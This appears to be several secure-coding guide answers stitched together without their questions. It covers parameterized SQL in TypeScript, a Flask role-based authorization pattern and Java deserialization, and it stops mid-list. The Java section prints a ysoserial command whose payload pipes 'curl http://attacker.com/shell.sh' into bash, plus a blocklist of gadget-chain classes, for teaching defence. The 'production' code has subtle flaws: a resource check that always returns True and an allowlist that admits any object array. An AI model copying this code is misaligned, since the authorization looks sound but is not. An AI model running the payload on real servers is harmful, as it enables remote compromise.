**Defense in Depth Layers**:
1. QueryBuilder with bound parameters
   - All filters are applied using `andWhere("user.email ILIKE :email", { email: ... })`, ensuring dynamic parts are parameterized:
   ```typescript
   qb.andWhere("user.email ILIKE :email", { email: `%${email}%` });
   ```
   This prevents user-controlled data from changing the SQL structure.

2. Strict input validation and allow-listing
   - Role and status filters are constrained to known values before they reach the query:
   ```typescript
   const allowedRoles = ["user", "admin", "manager"];
   if (!allowedRoles.includes(filters.role)) {
       throw new Error("Invalid role filter");
   }
   ```
   This blocks attempts to smuggle SQL keywords or unexpected values into filters.

3. Centralized error handling and structured logging
   - All unexpected errors pass through `errorHandler`, which logs them and returns a generic response:
   ```typescript
   function errorHandler(err: unknown, _req: Request, res: Response): void {
       errorLog("Unhandled error", err);
       res.status(500).json({ error: "Internal server error" });
   }
   ```
   This avoids leaking stack traces or SQL details while providing audit evidence.

**Additional Protections**:
- Environment-specific configuration: Database credentials, logging levels, and ports are controlled via `process.env`, allowing stricter settings in production (e.g., no query logging).
- Rate limiting: `express-rate-limit` on the `/users` endpoint helps mitigate brute-force enumeration and expensive query abuse.
- Security headers and basic hardening: `helmet()` adds standard security headers, and pagination limits (`pageSize` bounded) reduce the impact of heavy queries or scraping attempts.

**For complex authorization scenarios, you need a proper Role-Based Access Control (RBAC) or Attribute-Based Access Control (ABAC) system with server-side permission resolution.**

**PRODUCTION PATTERN**:

```python
from flask import Flask, request, jsonify, g
from functools import wraps
from enum import Enum, auto
from typing import Set, List, Callable
import sqlite3
import jwt
import os
import logging
from datetime import datetime

app = Flask(__name__)
app.config['SECRET_KEY'] = os.environ.get('JWT_SECRET_KEY')

# Configure security logging
security_logger = logging.getLogger('security')
security_logger.setLevel(logging.INFO)
handler = logging.FileHandler('/var/log/app/security.log')
handler.setFormatter(logging.Formatter(
    '%(asctime)s - %(levelname)s - %(message)s'
))
security_logger.addHandler(handler)


class Permission(Enum):
    """Granular permissions - defined server-side only"""
    READ_USERS = auto()
    EDIT_USERS = auto()
    DELETE_USERS = auto()
    READ_POSTS = auto()
    EDIT_POSTS = auto()
    DELETE_POSTS = auto()
    MANAGE_ROLES = auto()
    VIEW_AUDIT_LOG = auto()
    SYSTEM_ADMIN = auto()


# Role-to-permission mapping - SERVER-SIDE ONLY
ROLE_PERMISSIONS = {
    'viewer': {
        Permission.READ_USERS,
        Permission.READ_POSTS,
    },
    'editor': {
        Permission.READ_USERS,
        Permission.READ_POSTS,
        Permission.EDIT_POSTS,
    },
    'moderator': {
        Permission.READ_USERS,
        Permission.READ_POSTS,
        Permission.EDIT_POSTS,
        Permission.DELETE_POSTS,
    },
    'admin': {
        Permission.READ_USERS,
        Permission.EDIT_USERS,
        Permission.DELETE_USERS,
        Permission.READ_POSTS,
        Permission.EDIT_POSTS,
        Permission.DELETE_POSTS,
        Permission.MANAGE_ROLES,
        Permission.VIEW_AUDIT_LOG,
    },
    'superadmin': {
        Permission.SYSTEM_ADMIN,  # Implies all permissions
    }
}


class AuthorizationService:
    """Centralized server-side authorization service"""

    def __init__(self, db_connection):
        self.db = db_connection

    def get_user_permissions(self, user_id: int) -> Set[Permission]:
        """Load all permissions from database - NEVER from client"""
        cursor = self.db.cursor()

        # Get user's roles from database
        cursor.execute("""
            SELECT r.name 
            FROM roles r
            JOIN user_roles ur ON r.id = ur.role_id
            WHERE ur.user_id = ? AND ur.is_active = 1
        """, (user_id,))

        user_roles = [row[0] for row in cursor.fetchall()]

        # Get custom permissions assigned directly to user
        cursor.execute("""
            SELECT p.name
            FROM permissions p
            JOIN user_permissions up ON p.id = up.permission_id
            WHERE up.user_id = ? AND up.is_active = 1
        """, (user_id,))

        custom_permissions = {row[0] for row in cursor.fetchall()}

        # Aggregate all permissions from roles
        all_permissions = set()
        for role in user_roles:
            if role in ROLE_PERMISSIONS:
                all_permissions.update(ROLE_PERMISSIONS[role])

        # Add custom permissions
        for perm_name in custom_permissions:
            try:
                all_permissions.add(Permission[perm_name])
            except KeyError:
                security_logger.warning(
                    f"Unknown permission '{perm_name}' for user {user_id}"
                )

        # Check for superadmin - grants all permissions
        if Permission.SYSTEM_ADMIN in all_permissions:
            all_permissions = set(Permission)

        return all_permissions

    def check_permission(
        self, 
        user_id: int, 
        required: Permission,
        resource_id: int = None,
        resource_type: str = None
    ) -> bool:
        """Check if user has specific permission, with optional resource context"""

        user_permissions = self.get_user_permissions(user_id)

        # Basic permission check
        if required not in user_permissions:
            return False

        # Resource-level authorization (ABAC component)
        if resource_id and resource_type:
            return self._check_resource_access(
                user_id, resource_id, resource_type, required
            )

        return True

    def _check_resource_access(
        self,
        user_id: int,
        resource_id: int,
        resource_type: str,
        action: Permission
    ) -> bool:
        """Check resource-level access (e.g., own posts only)"""
        cursor = self.db.cursor()

        if resource_type == 'post':
            # Users can edit their own posts even without EDIT_POSTS permission
            cursor.execute(
                "SELECT author_id FROM posts WHERE id = ?",
                (resource_id,)
            )
            result = cursor.fetchone()
            if result and result[0] == user_id:
                return True

        return True  # If has permission, allow unless resource-specific rule denies


def get_db():
    if 'db' not in g:
        g.db = sqlite3.connect('app.db')
    return g.db


def get_auth_service():
    if 'auth_service' not in g:
        g.auth_service = AuthorizationService(get_db())
    return g.auth_service


def authenticate(f):
    """Authentication decorator - verifies identity"""
    @wraps(f)
    def decorated(*args, **kwargs):
        token = request.headers.get('Authorization', '').replace('Bearer ', '')

        if not token:
            return jsonify({'error': 'Authentication required'}), 401

        try:
            payload = jwt.decode(
                token,
                app.config['SECRET_KEY'],
                algorithms=['HS256']
            )

            # Load user from database
            cursor = get_db().cursor()
            cursor.execute(
                "SELECT id, username, is_active FROM users WHERE id = ?",
                (payload['user_id'],)
            )
            user = cursor.fetchone()

            if not user:
                security_logger.warning(
                    f"Token for non-existent user: {payload['user_id']}"
                )
                return jsonify({'error': 'User not found'}), 401

            if not user[2]:  # is_active check
                security_logger.warning(
                    f"Disabled user attempted access: {user[0]}"
                )
                return jsonify({'error': 'Account disabled'}), 403

            g.current_user_id = user[0]
            g.current_username = user[1]

        except jwt.ExpiredSignatureError:
            return jsonify({'error': 'Token expired'}), 401
        except jwt.InvalidTokenError as e:
            security_logger.warning(f"Invalid token attempt: {e}")
            return jsonify({'error': 'Invalid token'}), 401

        return f(*args, **kwargs)
    return decorated


def require_permission(*required_permissions: Permission):
    """Authorization decorator - verifies permissions server-side"""
    def decorator(f):
        @wraps(f)
        def decorated(*args, **kwargs):
            auth_service = get_auth_service()
            user_permissions = auth_service.get_user_permissions(
                g.current_user_id
            )

            # Check all required permissions
            missing = []
            for perm in required_permissions:
                if perm not in user_permissions:
                    missing.append(perm.name)

            if missing:
                security_logger.warning(
                    f"AUTHORIZATION_DENIED | "
                    f"user_id={g.current_user_id} | "
                    f"path={request.path} | "
                    f"method={request.method} | "
                    f"missing_permissions={missing} | "
                    f"ip={request.remote_addr}"
                )
                return jsonify({
                    'error': 'Insufficient permissions',
                    'required': missing
                }), 403

            # Log successful authorization for audit trail
            security_logger.info(
                f"AUTHORIZATION_GRANTED | "
                f"user_id={g.current_user_id} | "
                f"path={request.path} | "
                f"method={request.method}"
            )

            return f(*args, **kwargs)
        return decorated
    return decorator


# Example endpoints with proper authorization

@app.route('/api/users', methods=['GET'])
@authenticate
@require_permission(Permission.READ_USERS)
def list_users():
    """List users - requires READ_USERS permission"""
    cursor = get_db().cursor()
    cursor.execute("SELECT id, username, email, created_at FROM users")
    users = [
        {'id': r[0], 'username': r[1], 'email': r[2], 'created_at': r[3]}
        for r in cursor.fetchall()
    ]
    return jsonify({'users': users})


@app.route('/api/users/<int:user_id>', methods=['DELETE'])
@authenticate
@require_permission(Permission.DELETE_USERS)
def delete_user(user_id):
    """Delete user - requires DELETE_USERS permission"""
    # Prevent self-deletion
    if user_id == g.current_user_id:
        return jsonify({'error': 'Cannot delete yourself'}), 400

    cursor = get_db().cursor()
    cursor.execute("DELETE FROM users WHERE id = ?", (user_id,))
    get_db().commit()

    security_logger.info(
        f"USER_DELETED | deleted_user_id={user_id} | "
        f"by_user_id={g.current_user_id}"
    )

    return jsonify({'message': 'User deleted'})


@app.route('/api/posts/<int:post_id>', methods=['PUT'])
@authenticate
def edit_post(post_id):
    """Edit post - requires EDIT_POSTS or ownership"""
    auth_service = get_auth_service()

    # Check resource-level access
    cursor = get_db().cursor()
    cursor.execute("SELECT author_id FROM posts WHERE id = ?", (post_id,))
    post = cursor.fetchone()

    if not post:
        return jsonify({'error': 'Post not found'}), 404

    # Allow if user owns the post OR has EDIT_POSTS permission
    is_owner = post[0] == g.current_user_id
    has_edit_permission = auth_service.check_permission(
        g.current_user_id, Permission.EDIT_POSTS
    )

    if not is_owner and not has_edit_permission:
        security_logger.warning(
            f"EDIT_POST_DENIED | post_id={post_id} | "
            f"user_id={g.current_user_id} | is_owner={is_owner}"
        )
        return jsonify({'error': 'Cannot edit this post'}), 403

    # Proceed with edit
    data = request.get_json()
    cursor.execute(
        "UPDATE posts SET content = ?, updated_at = ? WHERE id = ?",
        (data.get('content'), datetime.utcnow().isoformat(), post_id)
    )
    get_db().commit()

    return jsonify({'message': 'Post updated'})


@app.teardown_appcontext
def close_db(exception):
    db = g.pop('db', None)
    if db is not None:
        db.close()
```

**Defense in Depth Layers**:

1. **Authentication Layer**: JWT verification with signature validation - identity confirmed before any authorization check

2. **Role-Based Access Control**: Permissions aggregated from server-side role definitions, never from client input

3. **Resource-Level Authorization**: Additional checks for resource ownership (users can edit their own posts)

4. **Audit Logging**: All authorization decisions logged with user ID, resource, and outcome

**Additional Protections**:

- **Permission caching**: For high-traffic APIs, cache user permissions in Redis with short TTL (5 minutes) and invalidate on role changes
- **Rate limiting on sensitive endpoints**: Prevent permission enumeration attacks
- **Permission change notifications**: Alert security team when admin permissions are granted
- **Separation of duties**: Require two admins to approve SYSTEM_ADMIN role grants
- **Time-bound elevated permissions**: Temporary admin access that auto-expires

**No, deserializing untrusted data in Java is extremely dangerous and is one of the most critical vulnerabilities that can lead to Remote Code Execution (RCE).** This vulnerability has been exploited in numerous high-profile breaches including the Apache Commons Collections gadget chains.

**VULNERABLE CODE**:

```java
import java.io.*;
import javax.servlet.http.*;
import java.util.Base64;

public class DataImportServlet extends HttpServlet {

    @Override
    protected void doPost(HttpServletRequest request, HttpServletResponse response) 
            throws IOException {

        // VULNERABLE: Deserializing untrusted user input
        String encodedData = request.getParameter("data");
        byte[] serializedData = Base64.getDecoder().decode(encodedData);

        try (ObjectInputStream ois = new ObjectInputStream(
                new ByteArrayInputStream(serializedData))) {

            // CRITICAL VULNERABILITY: No validation of object type
            Object userObject = ois.readObject();

            // Process the object
            processUserData(userObject);
            response.getWriter().write("Data imported successfully");

        } catch (ClassNotFoundException e) {
            response.sendError(500, "Invalid data format");
        }
    }

    private void processUserData(Object data) {
        // Business logic
    }
}
```

**Attack Payload** (using ysoserial tool):
```bash
# Generate malicious serialized object using ysoserial
java -jar ysoserial.jar CommonsCollections6 'curl http://attacker.com/shell.sh | bash' | base64

# The base64 output is sent as the 'data' parameter
# Upon deserialization, this executes the command on the server
```

**Why This Is Dangerous**:
- Java's `ObjectInputStream.readObject()` instantiates objects and can trigger arbitrary code execution through "gadget chains"
- Libraries like Apache Commons Collections, Spring, and others contain classes that can be chained to execute system commands
- The attacker doesn't need to know your application code - they exploit classes already on your classpath
- This leads to complete server compromise with the privileges of the Java process

**SECURE VERSION**:

```java
import java.io.*;
import javax.servlet.http.*;
import java.util.Set;
import java.util.HashSet;
import com.fasterxml.jackson.databind.ObjectMapper;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;

public class SecureDataImportServlet extends HttpServlet {
    private static final Logger logger = LoggerFactory.getLogger(SecureDataImportServlet.class);
    private static final ObjectMapper objectMapper = new ObjectMapper();

    // Define allowed classes for type-safe deserialization
    private static final Set<Class<?>> ALLOWED_TYPES = Set.of(
        UserDataDTO.class,
        ConfigurationDTO.class
    );

    @Override
    protected void doPost(HttpServletRequest request, HttpServletResponse response) 
            throws IOException {

        String contentType = request.getContentType();

        // SECURE: Use JSON instead of Java serialization
        if (!"application/json".equals(contentType)) {
            logger.warn("Rejected non-JSON content type from IP: {}", request.getRemoteAddr());
            response.sendError(415, "Only JSON content type is accepted");
            return;
        }

        try {
            // SECURE: Deserialize to specific, known type only
            UserDataDTO userData = objectMapper.readValue(
                request.getInputStream(), 
                UserDataDTO.class
            );

            // Validate the deserialized data
            if (!isValidUserData(userData)) {
                logger.warn("Invalid user data from IP: {}", request.getRemoteAddr());
                response.sendError(400, "Invalid data");
                return;
            }

            processUserData(userData);
            logger.info("Data imported successfully for user: {}", userData.getUserId());
            response.getWriter().write("Data imported successfully");

        } catch (Exception e) {
            logger.error("Data import failed: {}", e.getMessage());
            response.sendError(400, "Invalid data format");
        }
    }

    private boolean isValidUserData(UserDataDTO data) {
        return data != null && 
               data.getUserId() != null && 
               data.getUserId().matches("^[a-zA-Z0-9-]{1,36}$");
    }

    private void processUserData(UserDataDTO data) {
        // Business logic with validated, type-safe object
    }
}
```

**Key Security Controls**:
- **Use JSON/XML instead of Java serialization**: Jackson, Gson, or similar libraries deserialize to specific types without arbitrary code execution
- **Define explicit allowed types**: Never deserialize to `Object` - always specify the exact class expected
- **Input validation post-deserialization**: Validate all fields even after safe deserialization
- **Logging and monitoring**: Log all deserialization attempts for security monitoring

If you must use Java native serialization (though I strongly recommend migrating away), there are defense-in-depth measures you can implement. Note that even with these controls, native deserialization remains risky.

**PRODUCTION PATTERN**:

```java
import java.io.*;
import java.util.Set;
import java.util.HashSet;
import java.util.concurrent.atomic.AtomicLong;
import javax.servlet.http.*;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;

public class SecureDeserializationService {
    private static final Logger logger = LoggerFactory.getLogger(SecureDeserializationService.class);
    private static final Logger securityLogger = LoggerFactory.getLogger("SECURITY_AUDIT");

    // Strict allowlist of permitted classes
    private static final Set<String> ALLOWED_CLASSES = Set.of(
        "com.myapp.dto.UserDataDTO",
        "com.myapp.dto.ConfigurationDTO",
        "java.lang.String",
        "java.lang.Integer",
        "java.lang.Long",
        "java.util.ArrayList",
        "java.util.HashMap"
    );

    // Known dangerous classes to explicitly block
    private static final Set<String> BLOCKED_CLASSES = Set.of(
        "org.apache.commons.collections.functors",
        "org.apache.commons.collections4.functors",
        "org.apache.xalan",
        "com.sun.rowset.JdbcRowSetImpl",
        "javax.management",
        "org.springframework.beans.factory",
        "com.mchange.v2.c3p0",
        "org.hibernate",
        "com.zaxxer.hikari"
    );

    private static final int MAX_SERIALIZED_SIZE = 1024 * 100; // 100KB limit
    private static final AtomicLong deserializationCount = new AtomicLong(0);

    /**
     * Secure ObjectInputStream that validates classes before loading
     */
    private static class ValidatingObjectInputStream extends ObjectInputStream {
        private final String clientIp;
        private int objectCount = 0;
        private static final int MAX_OBJECTS = 100;

        public ValidatingObjectInputStream(InputStream in, String clientIp) throws IOException {
            super(in);
            this.clientIp = clientIp;
        }

        @Override
        protected Class<?> resolveClass(ObjectStreamClass desc) 
                throws IOException, ClassNotFoundException {

            String className = desc.getName();
            objectCount++;

            // Limit number of objects to prevent resource exhaustion
            if (objectCount > MAX_OBJECTS) {
                securityLogger.error("Object count exceeded limit. IP: {}, Class: {}", 
                    clientIp, className);
                throw new InvalidClassException("Object count limit exceeded");
            }

            // Check against blocklist first
            for (String blocked : BLOCKED_CLASSES) {
                if (className.startsWith(blocked)) {
                    securityLogger.error(
                        "BLOCKED deserialization attempt! IP: {}, Class: {}", 
                        clientIp, className);
                    throw new InvalidClassException(
                        className, "Deserialization of this class is not allowed");
                }
            }

            // Then verify against allowlist
            if (!ALLOWED_CLASSES.contains(className) && 
                !className.startsWith("[L") && // Allow arrays of allowed types
                !isPrimitiveArray(className)) {

                securityLogger.warn(
                    "Unauthorized class deserialization attempt. IP: {}, Class: {}", 
                    clientIp, className);
                throw new InvalidClassException(
                    className, "Deserialization of this class is not allowed");
            }

            logger.debug("Allowing deserialization of: {}", className);
            return super.resolveClass(desc);
        }

        private boolean isPrimitiveArray(String className) {
            return className.equals("[B") || // byte[]
                   className.equals("[C") || // char[]
                   className.equals("[I") || // int[]
                   className.equals("[J");   // long[]
        }
    }

    public <T> T deserialize(byte[] data, Class<T> expectedType, String clientIp) 
            throws DeserializationException {

        long requestId = deserializationCount.incrementAndGet();

        // Defense Layer 1: Size validation
        if (data == null || data.length == 0) {
            throw new DeserializationException("Empty data");
        }

        if (data.length > MAX_SERIALIZED_SIZE) {
            securityLogger.warn(
                "Oversized serialized data rejected. RequestId: {}, IP: {}, Size: {}", 
                requestId, clientIp, data.length);
            throw new DeserializationException("Data exceeds maximum allowed size");
        }

        // Defense Layer 2: Magic bytes validation
        if (!hasValidSerializationHeader(data)) {
            securityLogger.warn(
                "Invalid serialization header. RequestId: {}, IP: {}", 
                requestId, clientIp);
            throw new DeserializationException("Invalid data format");
        }

        // Defense Layer 3: Deserialize with class filtering
        try (ValidatingObjectInputStream ois = new ValidatingObjectInputStream(
                new ByteArrayInputStream(data), clientIp)) {

            Object result = ois.readObject();

            // Defense Layer 4: Type verification after deserialization
            if (!expectedType.isInstance(result)) {
                securityLogger.error(
                    "Type mismatch after deserialization. RequestId: {}, Expected: {}, Got: {}", 
                    requestId, expectedType.getName(), result.getClass().getName());
                throw new DeserializationException("Unexpected object type");
            }

            securityLogger.info(
                "Successful deserialization. RequestId: {}, IP: {}, Type: {}", 
                requestId, clientIp, expectedType.getName());

            return expectedType.cast(result);

        } catch (InvalidClassException e) {
            securityLogger.error(
                "Blocked class during deserialization. RequestId: {}, IP: {}, Error: {}", 
                requestId, clientIp, e.getMessage());
            throw new DeserializationException("Invalid data", e);
        } catch (IOException | ClassNotFoundException e) {
            logger.error("Deserialization failed. RequestId: {}", requestId, e);
            throw new DeserializationException("Deserialization failed", e);
        }
    }

    private boolean hasValidSerializationHeader(byte[] data) {
        // Java serialization magic bytes: AC ED 00 05
        return data.length >= 4 &&
               data[0] == (byte) 0xAC &&
               data[1] == (byte) 0xED &&
               data[2] == (byte) 0x00 &&
               data[3] == (byte) 0x05;
    }

    public static class DeserializationException extends Exception {
        public DeserializationException(String message) {
            super(message);
        }
        public DeserializationException(String message, Throwable cause) {
            super(message, cause);
        }
    }
}
```

**Defense in Depth Layers**:

1. **Size Limitation**:
